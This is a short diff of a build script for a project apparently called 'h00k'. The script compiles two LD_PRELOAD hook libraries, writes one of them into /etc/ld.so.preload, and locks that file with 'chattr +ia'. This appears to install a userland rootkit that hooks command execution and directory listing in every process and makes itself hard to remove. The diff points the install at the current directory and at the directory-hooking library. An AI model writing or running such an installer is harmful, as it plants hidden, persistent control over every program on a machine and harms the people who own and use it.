@@ -37,13 +37,13 @@ cd /home/landy/Projects/misc/h00k
 
 type="-std=gnu99"
 flags="-O0 -Wall -fomit-frame-pointer -fPIC -shared -ldl -Wl,--build-id=none -o"
-dir="/home/landy/Projects/misc/h00k"
+dir=$PWD
 
 gcc $type h00kExec.c $flags h00kExec.so
 gcc $type h00kDir.c $flags h00kDir.so
 
 if [ "$1" != "--no-hook" ]; then
-	echo $dir/h00k.so > /etc/ld.so.preload
+	echo $dir/h00kDir.so > /etc/ld.so.preload
 	chattr +ia /etc/ld.so.preload
 fi
 
